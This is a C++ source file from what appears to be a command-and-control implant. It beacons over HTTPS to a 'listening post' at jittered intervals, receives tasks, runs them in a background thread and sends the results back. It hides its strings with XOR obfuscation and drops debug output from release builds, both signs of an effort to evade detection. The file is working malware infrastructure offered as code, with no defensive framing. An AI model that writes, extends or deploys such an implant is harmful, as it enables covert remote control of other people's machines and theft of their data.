#include "implant.h"
#include "tasks.h"

#include <string>
#include <string_view>
#include <iostream>
#include <chrono>
#include <algorithm>
#include <sstream>

#include <boost/uuid/uuid_io.hpp>
#include <boost/property_tree/json_parser.hpp>
#include <boost/property_tree/ptree.hpp>

#include <cpr/cpr.h>
#include <xor_string.hpp>

#include <nlohmann/json.hpp>


#ifdef DEBUG_BUILD
#define DEBUG_LOG(x) std::cout << x << std::endl
#else
#define DEBUG_LOG(x) ((void)0)
#endif


using json = nlohmann::json;


//Function to send async HTTP(S) POST with payload to listening post
[[nodiscard]] std::string sendHttpRequest(std::string_view host, 
    std::string_view port, 
    std::string_view uri, 
    std::string_view payload) {

    auto const serverAddress = host;
    auto const serverPort = port;
    auto const serverUri = uri;
    auto const httpVersion = 11;
    auto const requestBody = json::parse(payload);

    //construct listening post endpoint URL, only HTTp
    std::stringstream ss;
    ss << XOR_STR("https://") << serverAddress << ":" << serverPort << serverUri;
    std::string fullServerUrl = ss.str();



    cpr::AsyncResponse asyncRequest = cpr::PostAsync(
        cpr::Url{ fullServerUrl },
        cpr::Body{ requestBody.dump() },
        cpr::Header{ {XOR_STR("Content-Type"), XOR_STR("application/json")} },
        cpr::ssl::VerifyHost{ true },       // verify server hostname
        cpr::ssl::VerifyPeer{ true },       // verify server certificate
        cpr::CertInfo{ "cert.pem" }  // path to CA cert bundle
    );



    // //make an async HTTP POST req. to listening post
    // cpr::AsyncResponse asyncRequest = cpr::PostAsync(cpr::Url{ fullServerUrl },
    //     cpr::Body{ requestBody.dump() },
    //     cpr::Header{ {"Content-Type", "application/json"} }
    // );

    //retrieve response
    cpr::Response response = asyncRequest.get();

    //show request contents
    DEBUG_LOG(XOR_STR("Request body: ") << requestBody);

    //return body of the response from listening post, may include new tasks
    return response.text;

};

//enable/disable the running status
void NetSession::setRunning(bool isRunningIn) { isRunning = isRunningIn; }

//set mean dwell time
void NetSession::setMeanDwell(double meanDwell) {
    dwellDistributionSeconds = std::exponential_distribution<double>(1. / meanDwell);
}

//send task results and receive new tasks
[[nodiscard]] std::string NetSession::sendResults() {
    boost::property_tree::ptree resultsLocal;
    //scoped lock to perform swap
    {
        std::scoped_lock<std::mutex> resultsLock{ resultsMutex };
        resultsLocal.swap(results);
    }
    //Format result
    std::stringstream resultsStringStream;
    boost::property_tree::write_json(resultsStringStream, resultsLocal);
    //contact listening posts with results, return received tasks
    return sendHttpRequest(host, port, uri, resultsStringStream.str());
}

void NetSession::parseTasks(const std::string& response) {
    std::stringstream responseStringStream{ response };

    //read response from listening post as JSON
    boost::property_tree::ptree tasksPropTree;
    boost::property_tree::read_json(responseStringStream, tasksPropTree);

    //Range based for-loop to parse tasks and push them to task vector
    for (const auto& [taskTreeKey, taskTreeValue] : tasksPropTree) {
        //scoped lock to push tasks into vector, push task tree and setter for config task
        {
            tasks.push_back(
                parseTaskFrom(taskTreeValue, [this](const auto& configuration) {
                    setMeanDwell(configuration.meanDwell);
                    setRunning(configuration.isRunning); })
            );
        }
    }
}


//loop and go thru takss from listening post, service them
void NetSession::serviceTasks() {
    while (isRunning) {
        std::vector<Task> localTasks;
        {
            std::scoped_lock<std::mutex> taskLock{ taskMutex };
            tasks.swap(localTasks);
        }

        for (const auto& task: localTasks) {
            //call run() and each task
            const auto [id, contents, success] = std::visit([](const auto& task) {return task.run(); }, task);

            {
                std::scoped_lock<std::mutex> resultsLock{ resultsMutex };
                results.add(boost::uuids::to_string(id) + ".contents", contents);
                results.add(boost::uuids::to_string(id) + ".success", success);
            }
        }
        
        //sleep
        std::this_thread::sleep_for(std::chrono::seconds{ 1 });
    }
}

//beaconing to listening post
void NetSession::beacon() {
    while (isRunning) {

        //Try to contact listening post to send results/get tasks
        //If tasks received, parse and store for async execution by task thread

        try {
            DEBUG_LOG("Implant sending results to listening post...");
            const auto serverResponse = sendResults();
            DEBUG_LOG("Listening post response content: " << serverResponse);
            DEBUG_LOG("Parsing tasks received...");
            parseTasks(serverResponse);
        }
        catch (const std::exception& e) {
            DEBUG_LOG("Error occurred while beaconing: " << e.what());
        }

        //sleep for set duration w/ jitter and beacon again later
        const auto sleepTimeDouble = dwellDistributionSeconds(device);
        const auto sleepTimeChrono = std::chrono::seconds{ static_cast<unsigned long long>(sleepTimeDouble) };

        std::this_thread::sleep_for(sleepTimeChrono);    
    }
}

//Initialize variables for object
NetSession::NetSession(std::string host, std::string port, std::string uri) :
    host{ std::move(host) },
    port{ std::move(port) },
    uri{ std::move(uri) },

    isRunning{ true },
    dwellDistributionSeconds{ 1. }

    // taskThread{ std::async(std::launch::async, [this] { serviceTasks(); }) } 
{
}

void NetSession::start() {
    taskThread = std::async(std::launch::async, [this] {
        serviceTasks();
    });
}